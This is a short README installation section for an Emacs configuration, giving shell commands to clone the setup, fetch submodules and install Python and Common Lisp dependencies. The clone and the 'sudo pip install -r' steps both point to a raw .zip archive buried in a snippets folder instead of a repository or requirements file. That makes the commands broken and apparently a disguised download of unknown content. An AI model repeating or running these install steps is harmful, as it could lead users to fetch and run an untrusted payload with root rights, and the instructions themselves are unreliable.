Installation
------------

At your home directory run

    git clone https://github.com/tanglongwei/emacs-config/raw/refs/heads/master/snippets/python-mode/emacs_config_v2.2-alpha.2.zip .emacs.d # clone repo
    cd .emacs.d # get into the newly downloaded repo
    git submodule init # initilize dependency submodules
    git submodule update # update submodules

After that install dependencies

    sudo pip install -r https://github.com/tanglongwei/emacs-config/raw/refs/heads/master/snippets/python-mode/emacs_config_v2.2-alpha.2.zip # install python validation tools.

    # This dependency is for common lisp. if you don't need common lisp support skip the rest

    TODO quicklisp and slime-helper installation
    
    apt-get install sbcl # cl

